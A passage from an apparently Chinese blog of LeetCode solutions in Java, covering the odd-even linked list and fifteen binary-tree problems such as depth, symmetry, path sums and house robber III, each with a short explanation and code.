N / k;</span><br><span class="line">        ListNode[] ret = <span class="keyword">new</span> ListNode[k];</span><br><span class="line">        cur = root;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; cur != <span class="keyword">null</span> &amp;&amp; i &lt; k; i++) &#123;</span><br><span class="line">            ret[i] = cur;</span><br><span class="line">            <span class="keyword">int</span> curSize = size + (mod-- &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; curSize - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                cur = cur.next;</span><br><span class="line">            &#125;</span><br><span class="line">            ListNode next = cur.next;</span><br><span class="line">            cur.next = <span class="keyword">null</span>;</span><br><span class="line">            cur = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-链表元素按奇偶聚集"><a class="markdownIt-Anchor" href="#10-链表元素按奇偶聚集"></a> 10. 链表元素按奇偶聚集</h3><p>  <a href="https://leetcode-cn.com/problems/odd-even-linked-list/">https://leetcode-cn.com/problems/odd-even-linked-list/</a></p><h4 id="思路-86"><a class="markdownIt-Anchor" href="#思路-86"></a> 思路</h4><p>  奇数节点的next是偶数节点指针的next，偶数节点的next是奇数节点指针的next。</p><h4 id="代码-84"><a class="markdownIt-Anchor" href="#代码-84"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">oddEvenList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span>||head.next==<span class="keyword">null</span>||head.next.next==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode singlehead=head;</span><br><span class="line">        ListNode midhead=head.next;</span><br><span class="line">        ListNode doublehead=head.next;</span><br><span class="line">        <span class="keyword">while</span> (singlehead.next != <span class="keyword">null</span> &amp;&amp; doublehead.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            singlehead.next = doublehead.next;</span><br><span class="line">            singlehead =singlehead.next;</span><br><span class="line">            doublehead.next = singlehead.next;</span><br><span class="line">            doublehead = doublehead.next;</span><br><span class="line">        &#125;</span><br><span class="line">        singlehead.next=midhead;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二-树"><a class="markdownIt-Anchor" href="#二-树"></a> 二、树</h2><h3 id="1-树的高度"><a class="markdownIt-Anchor" href="#1-树的高度"></a> 1. 树的高度</h3><p>  <a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/submissions/">https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/submissions/</a></p><h4 id="思路-87"><a class="markdownIt-Anchor" href="#思路-87"></a> 思路</h4><p>  递归求解</p><h4 id="代码-85"><a class="markdownIt-Anchor" href="#代码-85"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> Math.max(maxDepth(root.left), maxDepth(root.right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-平衡树"><a class="markdownIt-Anchor" href="#2-平衡树"></a> 2. 平衡树</h3><p>  <a href="https://leetcode-cn.com/problems/balanced-binary-tree/">https://leetcode-cn.com/problems/balanced-binary-tree/</a></p><h4 id="思路-88"><a class="markdownIt-Anchor" href="#思路-88"></a> 思路</h4><p>  递归查找左右子树高度，比较判断高度差。</p><h4 id="代码-86"><a class="markdownIt-Anchor" href="#代码-86"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">boolean</span> balance=<span class="keyword">true</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isBalanced</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        maxdepth(root);</span><br><span class="line">        <span class="keyword">return</span> balance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxdepth</span><span class="params">(TreeNode root)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> left=maxdepth(root.left);</span><br><span class="line">        <span class="keyword">int</span> right=maxdepth(root.right);</span><br><span class="line">        <span class="keyword">if</span>((left-right)&gt;<span class="number">1</span>||(left-right)&lt;-<span class="number">1</span>)</span><br><span class="line">            balance=<span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> Math.max(left,right)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-两节点的最长路径"><a class="markdownIt-Anchor" href="#3-两节点的最长路径"></a> 3. 两节点的最长路径</h3><p>  <a href="https://leetcode-cn.com/problems/diameter-of-binary-tree/">https://leetcode-cn.com/problems/diameter-of-binary-tree/</a></p><h4 id="思路-89"><a class="markdownIt-Anchor" href="#思路-89"></a> 思路</h4><p>  最长长度一定是某个节点的左右子树长度之和，故只需查找左右子树高度，然后相加找最大值。</p><h4 id="代码-87"><a class="markdownIt-Anchor" href="#代码-87"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">diameterOfBinaryTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        maxdepth(root);</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxdepth</span><span class="params">(TreeNode root)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> left=maxdepth(root.left);</span><br><span class="line">        <span class="keyword">int</span> right=maxdepth(root.right);</span><br><span class="line">        max=Math.max(max,left+right);</span><br><span class="line">        <span class="keyword">return</span> Math.max(left,right)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-翻转树"><a class="markdownIt-Anchor" href="#4-翻转树"></a> 4. 翻转树</h3><p>  <a href="https://leetcode-cn.com/problems/invert-binary-tree/">https://leetcode-cn.com/problems/invert-binary-tree/</a></p><h4 id="思路-90"><a class="markdownIt-Anchor" href="#思路-90"></a> 思路</h4><p>  交换左右子树即可。</p><h4 id="代码-88"><a class="markdownIt-Anchor" href="#代码-88"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">invertTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 后面的操作会改变 left 指针，因此先保存下来</span></span><br><span class="line">        TreeNode left = root.left;  </span><br><span class="line">        root.left = invertTree(root.right);</span><br><span class="line">        root.right = invertTree(left);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-归并两棵树"><a class="markdownIt-Anchor" href="#5-归并两棵树"></a> 5. 归并两棵树</h3><p>  <a href="https://leetcode-cn.com/problems/merge-two-binary-trees/">https://leetcode-cn.com/problems/merge-two-binary-trees/</a></p><h4 id="思路-91"><a class="markdownIt-Anchor" href="#思路-91"></a> 思路</h4><p>  递归同时遍历两棵树，相同位置节点值相加,如果有一边已经为空，则直接返回节点。</p><h4 id="代码-89"><a class="markdownIt-Anchor" href="#代码-89"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">mergeTrees</span><span class="params">(TreeNode t1, TreeNode t2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(t1==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> t2;</span><br><span class="line">        <span class="keyword">if</span>(t2==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> t1;</span><br><span class="line">        t1.val=t1.val+t2.val;</span><br><span class="line">        t1.left=mergeTrees(t1.left,t2.left);</span><br><span class="line">        t1.right=mergeTrees(t1.right,t2.right);</span><br><span class="line">        <span class="keyword">return</span> t1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-判断路径和是否等于一个数"><a class="markdownIt-Anchor" href="#6-判断路径和是否等于一个数"></a> 6. 判断路径和是否等于一个数</h3><p>  <a href="https://leetcode-cn.com/problems/path-sum/">https://leetcode-cn.com/problems/path-sum/</a></p><h4 id="思路-92"><a class="markdownIt-Anchor" href="#思路-92"></a> 思路</h4><p>  左右递归遍历，有一路为真即可，遍历时每层剪掉当前值，看是否为0。</p><h4 id="代码-90"><a class="markdownIt-Anchor" href="#代码-90"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) </span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span> &amp;&amp; root.val == sum) </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">return</span> hasPathSum(root.left, sum - root.val) || hasPathSum(root.right, sum - root.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-统计路径和等于一个数的路径数量"><a class="markdownIt-Anchor" href="#7-统计路径和等于一个数的路径数量"></a> 7. 统计路径和等于一个数的路径数量</h3><p>  <a href="https://leetcode-cn.com/problems/path-sum-iii/">https://leetcode-cn.com/problems/path-sum-iii/</a></p><h4 id="思路-93"><a class="markdownIt-Anchor" href="#思路-93"></a> 思路</h4><p>  双重递归，一方面递归所有节点，另一方面递归从当前节点出发，是否有路径满足需求。</p><h4 id="代码-91"><a class="markdownIt-Anchor" href="#代码-91"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> find(root,sum)+pathSum(root.left,sum)+pathSum(root.right,sum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(TreeNode root,<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        sum-=root.val;</span><br><span class="line">        <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(sum==<span class="number">0</span>)</span><br><span class="line">            count++;</span><br><span class="line">        count+=find(root.left,sum)+find(root.right,sum);</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-子树"><a class="markdownIt-Anchor" href="#8-子树"></a> 8. 子树</h3><p>  <a href="https://leetcode-cn.com/problems/subtree-of-another-tree/">https://leetcode-cn.com/problems/subtree-of-another-tree/</a></p><h4 id="思路-94"><a class="markdownIt-Anchor" href="#思路-94"></a> 思路</h4><p>  双重递归，一次递归所有节点，另一次递归所有从当前节点出发的子树是否和t一样。</p><h4 id="代码-92"><a class="markdownIt-Anchor" href="#代码-92"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">boolean</span> issame=<span class="keyword">false</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSubtree</span><span class="params">(TreeNode s, TreeNode t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s==<span class="keyword">null</span>&amp;&amp;t==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(s==<span class="keyword">null</span>&amp;&amp;t!=<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(s!=<span class="keyword">null</span>&amp;&amp;t==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">return</span> compare(s,t)||isSubtree(s.left,t)||isSubtree(s.right,t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">compare</span><span class="params">(TreeNode s,TreeNode t)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s==<span class="keyword">null</span>&amp;&amp;t==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(s==<span class="keyword">null</span>||t==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(s.val!=t.val)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> compare(s.left,t.left)&amp;&amp;compare(s.right,t.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-树的对称"><a class="markdownIt-Anchor" href="#9-树的对称"></a> 9. 树的对称</h3><p>  <a href="https://leetcode-cn.com/problems/symmetric-tree/">https://leetcode-cn.com/problems/symmetric-tree/</a></p><h4 id="思路-95"><a class="markdownIt-Anchor" href="#思路-95"></a> 思路</h4><p>  左右子树对称判断是否相等</p><h4 id="代码-93"><a class="markdownIt-Anchor" href="#代码-93"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSymmetric</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">return</span> issame(root.left,root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">issame</span><span class="params">(TreeNode left,TreeNode right)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left==<span class="keyword">null</span>&amp;&amp;right==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(left==<span class="keyword">null</span>||right==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(left.val!=right.val)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> issame(left.left,right.right)&amp;&amp;issame(left.right,right.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-最小路径"><a class="markdownIt-Anchor" href="#10-最小路径"></a> 10. 最小路径</h3><p>  <a href="https://leetcode-cn.com/problems/minimum-depth-of-binary-tree/">https://leetcode-cn.com/problems/minimum-depth-of-binary-tree/</a></p><h4 id="思路-96"><a class="markdownIt-Anchor" href="#思路-96"></a> 思路</h4><p>  向两侧遍历左子树和右子树的深度，取最小值。<br />  当遍历到有子节点为空时，两侧皆空为叶子结点，返回0，一侧为空则不符合要求，还需遍历另一侧。</p><h4 id="代码-94"><a class="markdownIt-Anchor" href="#代码-94"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> left = minDepth(root.left);</span><br><span class="line">        <span class="keyword">int</span> right = minDepth(root.right);</span><br><span class="line">        <span class="keyword">if</span> (left == <span class="number">0</span> || right == <span class="number">0</span>) </span><br><span class="line">            <span class="keyword">return</span> left + right + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> Math.min(left, right) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-统计左叶子节点的和"><a class="markdownIt-Anchor" href="#11-统计左叶子节点的和"></a> 11. 统计左叶子节点的和</h3><p>  <a href="https://leetcode-cn.com/problems/sum-of-left-leaves/">https://leetcode-cn.com/problems/sum-of-left-leaves/</a></p><h4 id="思路-97"><a class="markdownIt-Anchor" href="#思路-97"></a> 思路</h4><p>  用一个辅助函数判断当前节点是否为叶子节点，然后遍历这棵树，对每个节点的左子节点进行一次判断，如果是叶子节点就进行累加。</p><h4 id="代码-95"><a class="markdownIt-Anchor" href="#代码-95"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (isLeaf(root.left)) </span><br><span class="line">            <span class="keyword">return</span> root.left.val + sumOfLeftLeaves(root.right);</span><br><span class="line">        <span class="keyword">return</span> sumOfLeftLeaves(root.left) + sumOfLeftLeaves(root.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isLeaf</span><span class="params">(TreeNode node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="keyword">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> node.left == <span class="keyword">null</span> &amp;&amp; node.right == <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-相同节点值的最大路径长度"><a class="markdownIt-Anchor" href="#12-相同节点值的最大路径长度"></a> 12. 相同节点值的最大路径长度</h3><p>  <a href="https://leetcode-cn.com/problems/longest-univalue-path/comments/">https://leetcode-cn.com/problems/longest-univalue-path/comments/</a></p><h4 id="思路-98"><a class="markdownIt-Anchor" href="#思路-98"></a> 思路</h4><p>  对于每个节点，分别遍历左子树与当前节点值相等的长度，右子树与当前节点值相等的长度，然后累和取得当前同值路径长度，再取最大值。</p><h4 id="代码-96"><a class="markdownIt-Anchor" href="#代码-96"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestUnivaluePath</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        findmax(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findmax</span><span class="params">(TreeNode root)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> leftlength=findmax(root.left)+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> rightlength=findmax(root.right)+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span>||root.left.val!=root.val)</span><br><span class="line">            leftlength=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(root.right==<span class="keyword">null</span>||root.right.val!=root.val)</span><br><span class="line">            rightlength=<span class="number">0</span>;</span><br><span class="line">        res=Math.max(res,leftlength+rightlength);</span><br><span class="line">        <span class="keyword">return</span> Math.max(leftlength,rightlength);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-间隔遍历"><a class="markdownIt-Anchor" href="#13-间隔遍历"></a> 13. 间隔遍历</h3><p>  <a href="https://leetcode-cn.com/problems/house-robber-iii/">https://leetcode-cn.com/problems/house-robber-iii/</a></p><h4 id="思路-99"><a class="markdownIt-Anchor" href="#思路-99"></a> 思路</h4><p>  对于当前节点，一共有两种打劫的选择：</p><ol><li>打劫当前节点，则收益为当前节点+当前节点的左子节点的左右子节点+当前节点的右节点的左右子节点。</li><li>不打劫当前节点，则收益为当前节点的左子节点收益+右子节点收益。</li></ol><h4 id="代码-97"><a class="markdownIt-Anchor" href="#代码-97"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> option1=root.val;</span><br><span class="line">        <span class="keyword">if</span>(root.left!=<span class="keyword">null</span>)</span><br><span class="line">            option1+=rob(root.left.left)+rob(root.left.right);</span><br><span class="line">        <span class="keyword">if</span>(root.right!=<span class="keyword">null</span>)</span><br><span class="line">            option1+=rob(root.right.left)+rob(root.right.right);</span><br><span class="line">        <span class="keyword">int</span> option2=rob(root.left)+rob(root.right);</span><br><span class="line">        <span class="keyword">return</span> Math.max(option1,option2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="14-找出二叉树中第二小的节点"><a class="markdownIt-Anchor" href="#14-找出二叉树中第二小的节点"></a> 14. 找出二叉树中第二小的节点</h3><p>  <a href="https://leetcode-cn.com/problems/second-minimum-node-in-a-binary-tree/">https://leetcode-cn.com/problems/second-minimum-node-in-a-binary-tree/</a></p><h4 id="思路-100"><a class="markdownIt-Anchor" href="#思路-100"></a> 思路</h4><p>  因为二叉树的中任何一个节点的值一定不大于其子节点，所以我们从根节点开始左右遍历，分别找到第一个不相同的值，然后比较两侧大小即可。</p><h4 id="代码-98"><a class="markdownIt-Anchor" href="#代码-98"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> min=-<span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findSecondMinimumValue</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> min;</span><br><span class="line">        <span class="keyword">if</span>(root.left!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(root.left.val!=root.val)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(min==-<span class="number">1</span>)</span><br><span class="line">                    min=root.left.val;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    min=Math.min(min,root.left.val);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                findSecondMinimumValue(root.left);</span><br><span class="line">                </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.right!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(root.right.val!=root.val)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(min==-<span class="number">1</span>)</span><br><span class="line">                    min=root.right.val;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    min=Math.min(min,root.right.val);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                findSecondMinimumValue(root.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="15-一棵树每层节点的平均数"><a class="markdownIt-Anchor" href="#15-一棵树每层节点的平均数"></a> 15. 一棵树每层节点的平均数</h3><p>  <a href="https://leetcode-cn.com/problems/average-of-levels-in-binary-tree/">https://leetcode-cn.com/problems/average-of-levels-in-binary-tree/</a></p><h4 id="思路-101"><a class="markdownIt-Anchor" href="#思路-101"></a> 思路</h4><p>  用Double的List存每层的平均值，用Int的List存每层的节点个数，然后遍历计算。</p><h4 id="代码-99"><a class="markdownIt-Anchor" href="#代码-99"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    List&lt;Double&gt; res=<span class="keyword">new</span> ArrayList&lt;Double&gt;();</span><br><span class="line">    List&lt;Integer&gt; count=<span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Double&gt; <span class="title">averageOfLevels</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        cal(root,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cal</span><span class="params">(TreeNode root,<span class="keyword">int</span> depth)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        <span class="keyword">if</span>(res.size()&lt;=depth)</span><br><span class="line">        &#123;</span><br><span class="line">            res.add((<span class="keyword">double</span>)root.val);</span><br><span class="line">            count.add(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> curcount=count.get(depth);</span><br><span class="line">            <span class="keyword">double</span> curvalue=res.get(depth);</span><br><span class="line">            res.set(depth,(curvalue*curcount+root.val)/(curcount+<span class="number">1</span>));</span><br><span class="line">            count.set(depth,curcount+<span class="number">1</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        cal(root.left,depth+<span class="number">1</span>);</span><br><span class="line">        cal(root.right,depth+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-得到左下角的节点"><a 